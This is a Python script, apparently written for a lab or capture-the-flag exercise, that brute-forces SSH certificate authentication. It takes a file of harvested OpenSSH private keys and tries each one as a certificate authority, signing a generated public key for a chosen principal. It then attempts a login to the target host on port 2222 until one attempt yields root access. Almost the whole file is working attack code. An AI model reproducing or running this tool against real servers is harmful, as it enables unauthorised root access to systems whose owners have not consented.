import argparse
import os
import subprocess
import paramiko

def get_args():
    parser = argparse.ArgumentParser(description="Details required to perform bruteforce of keys.")

    parser.add_argument('-u', '--username', required=True, help="SSH username to login")
    parser.add_argument('-p', '--principal', required=True, help="Pincipal used for signing")
    parser.add_argument('-host', '--hostname', required=True, help="Host name or IP Address of server")
    parser.add_argument('-k', '--all-keys', required=True, help="File containing all keys in new lines")

    args = parser.parse_args()
    return args

def sshKeygen(private_key_file):
    result = subprocess.run(['ssh-keygen', '-t', 'rsa', '-f', private_key_file, '-q', '-N', ''])

def writeKey(keyFile, startIndex, endIndex):
    global keys
    count = startIndex

    if os.path.exists(keyFile):
        os.remove(keyFile)

    while count <= endIndex:
        with open(keyFile, 'a') as file:
            file.write(keys[count])
        count += 1

def keySign(keyFile, pubKeyFile, username, principal):
    # global current_directory, create_directory
    os.chmod(keyFile,0o600)
    result = subprocess.run(['ssh-keygen', '-s', keyFile, '-I', username, '-n', principal, pubKeyFile], capture_output=True)

def sshLogin(hostname, username, private_key_file, cert_filename):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        private_key = paramiko.RSAKey(filename=private_key_file)
        client.connect(
            hostname=hostname,
            username=username,
            key_filename=cert_filename,
            pkey=private_key,
            port=2222
        )
        print(f'[+] Successfully logeed in to {hostname} as {username}')
        return True
    
    except paramiko.AuthenticationException:
        print(f'[-] Authentication failed when connecting to {hostname} as {username}')
        return False
    
    except paramiko.SSHException as e:
        print(f'[-] Could not establish SSH connection: {e}')
        return False
        
    except ValueError as e:
        if "PublicBlob type ssh-rsa-cert-v01@openssh.com incompatible with key type ssh-dss" in str(e):
            print("[-] Incompatible key")
        else:
            print(f"[-] ValueError: {e}")

    finally:
        client.close()


args = get_args()
username = args.username
principal = args.principal
hostname = args.hostname
keysFile = args.all_keys

with open(keysFile,'r') as file:
    keys = file.readlines()

current_directory = os.getcwd()
create_directory = current_directory + '/' + 'keys'

print('[+] Creating Directory ./keys to store all keys')
if not os.path.exists(create_directory):
    os.mkdir(create_directory)

os.chdir(create_directory)

print('[+] Initiating generation of keypairs...')
priv_key_file = create_directory + '/' + 'id_rsa'
pub_key_file = create_directory + '/' + 'id_rsa.pub'

sshKeygen(priv_key_file)
print(f'[+] Keypairs Generated\n[+] Public key: {pub_key_file}\n[+] Private key: {priv_key_file}')

startIndexes = []
endIndexes = []

count = 0
while count < len(keys):
    if '-----BEGIN OPENSSH PRIVATE KEY-----' in keys[count]:
        startIndexes.append(count)
        keys[count] = keys[count].replace('\x00','')
    if '-----END OPENSSH PRIVATE KEY-----' in keys[count]:
        endIndexes.append(count)
    count += 1

print('[+] Initiating ssh bruteforcing...\n')
count = 0

while count < len(startIndexes):
    print(f'[+] Cycle: {count + 1}')
    keyFile = create_directory + '/' + 'key_' + str(count + 1) + '.key'

    startIndex = startIndexes[count]
    endIndex = endIndexes[count]

    print(f'[+] Writing cerificate key...')
    print(f'[+] Cerificate key file: {keyFile}')
    writeKey(keyFile,startIndex,endIndex)

    print('[+] Initiating signing public key using certificate...')
    keySign(keyFile, 'id_rsa.pub', username, principal)

    print('[+] Initiating SSH login...')
    if sshLogin(hostname, username, priv_key_file, 'id_rsa-cert.pub'):
        print(f'[+] Public key signed using {keyFile}, logged us as root on {hostname}')
        break
    count += 1

    print('\n')
